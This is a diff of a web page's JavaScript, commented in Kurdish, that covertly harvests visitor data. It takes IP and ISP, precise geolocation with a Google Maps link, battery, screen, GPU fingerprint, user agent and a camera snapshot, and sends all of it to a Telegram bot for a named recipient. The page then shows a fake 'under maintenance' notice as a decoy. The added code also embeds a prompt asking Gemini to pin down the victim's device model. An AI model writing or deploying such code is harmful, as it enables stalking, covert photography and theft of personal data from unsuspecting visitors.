@@ -59,7 +59,7 @@
 
             let visitTime = new Date().toISOString().replace('T', ' ').substring(0, 19);
             
-            // 1. مۆدێل
+            // 1. مۆدێلی ئامێر و سستەم
             let deviceModel = "نادیار";
             try {
                 const parser = new UAParser();
@@ -67,7 +67,9 @@
                 deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
             } catch (e) {}
 
-            // 2. IP
+            const userAgentText = navigator.userAgent;
+
+            // 2. IP و ISP
             let ip = 'نادیار', isp = 'نادیار';
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -76,16 +78,48 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            // 3. لۆکەیشن
+            // 3. لۆکەیشن و دروستکردنی باوەڕپێکراوی گوگل مەپس
             let locationText = "بەردەست نییە";
+            let mapLink = "";
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
                 });
-                locationText = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                let lat = pos.coords.latitude;
+                let lon = pos.coords.longitude;
+                locationText = `${lat}, ${lon}`;
+                mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             } catch (e) {}
 
-            // 4. وێنەی کامێرا
+            // 4. زانیاری باتری (شەحن)
+            let batteryInfo = "نەزانراو";
+            try {
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    let level = Math.round(bat.level * 100);
+                    let charging = bat.charging ? "⚡ (خەریکی شەحنکردنەوەیە)" : "🔋 (بێ شەحن / پاتری)";
+                    batteryInfo = `${level}% ${charging}`;
+                }
+            } catch (e) {}
+
+            // 5. ڕوونی شاشە و پیکسڵ ڕەیشیو
+            let screenRes = `${window.screen.width}x${window.screen.height}`;
+            let pixelRatio = window.devicePixelRatio || 1;
+
+            // 6. کارتی گرافیک (WebGL GPU)
+            let gpuInfo = "نەزانراو";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {}
+
+            // 7. وێنەی کامێرا
             let imageBlob = null;
             let cameraStatus = "سەرکەوتوو بوو";
             try {
@@ -110,15 +144,24 @@
                 cameraStatus = "نەگیرا";
             }
 
-            // دەقێکی زۆر سادە بێ مارکداون بۆ ئەوەی هەرگیز هەڵە نەدات
-            const msg = "سەردانیکەرێکی نوێ!\n\n" +
-                        "کات: " + visitTime + "\n" +
-                        "IP: " + ip + " (" + isp + ")\n" +
-                        "لۆکەیشن: " + locationText + "\n" +
-                        "کامێرا: " + cameraStatus + "\n" +
-                        "ئامێر: " + deviceModel;
+            // دروستکردنی نامەی ڕازاوە بۆ کاک میلاد
+            let mapTextPart = mapLink ? `📍 لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر گووگڵ ماپ بیبینی:\n${mapLink}\n(Lat & Long: ${locationText})` : `📍 لۆکەیشن: ${locationText}`;
 
-            // ناردنی دەقەکە بە بێ parse_mode بۆ دڵنیابوون لە گەیشتنی
+            const msg = `کاک میلاد فەرموو، زانیارییە تەواوەکانی سەردانیکەرەکە:\n\n` +
+                        `👤 سڵاو کاک میلاد، ئەمە وێنەی کەسەکەیە و وردەکارییەکانی بەم شێوەیەیە:\n\n` +
+                        `⏰ کات: ${visitTime}\n` +
+                        `🌐 IP کەسەکە: ${ip} (${isp})\n` +
+                        `${mapTextPart}\n` +
+                        `🔋 ڕێژەی شەحنی مۆبایل: ${batteryInfo}\n` +
+                        `📷 دۆخی کامێرا: ${cameraStatus}\n` +
+                        `📱 سیستەم/ئامێر: ${deviceModel}\n` +
+                        `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
+                        `🎮 کارتی گرافیک (GPU): ${gpuInfo}\n` +
+                        `🌐 User-Agent: ${userAgentText}\n\n` +
+                        `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
+                        `سڵاو! من زانیارییە تەکنیکییەکانی ئامێری سەردانیکەرێکم بۆ ناردوویت. تکایە بەپێی ئەم زانیارییانەی سەرەوە (بەتایبەت GPU WebGL، ڕوونی شاشە/Pixel Ratio، شەحن و دەقی User-Agent) شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری) و ئایا زانیارییەکان تەواو لەگەڵ یەکتردا دەگونجێن؟`;
+
+            // ناردنی دەقەکە بۆ تێلێگرام
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -130,13 +173,13 @@
                 });
             } catch (err) {}
 
-            // ناردنی وێنەکە لەگەڵ دەقەکەدا وەک caption (بەو شێوازەی کە سەرکەوتوو بوو)
+            // ناردنی وێنەکە لەگەڵ کێپشنی هاوشێوەدا
             if (imageBlob) {
                 try {
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('photo', imageBlob, 'capture.jpg');
-                    formData.append('caption', msg); // لێرەدا دەقەکە دەخەینە ناو وێنەکەشەوە تا دڵنیابین
+                    formData.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (کاک میلاد، ئەمەش وێنەکەیەتی)`);
                     
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
                         method: 'POST', 
@@ -145,7 +188,7 @@
                 } catch (err) {}
             }
 
-            // گەڕاندنەوەی باری ئاسایی
+            // گەڕاندنەوەی باری ئاسایی پەڕەکە
             document.getElementById('content-box').innerHTML = `
                 <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
                 <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
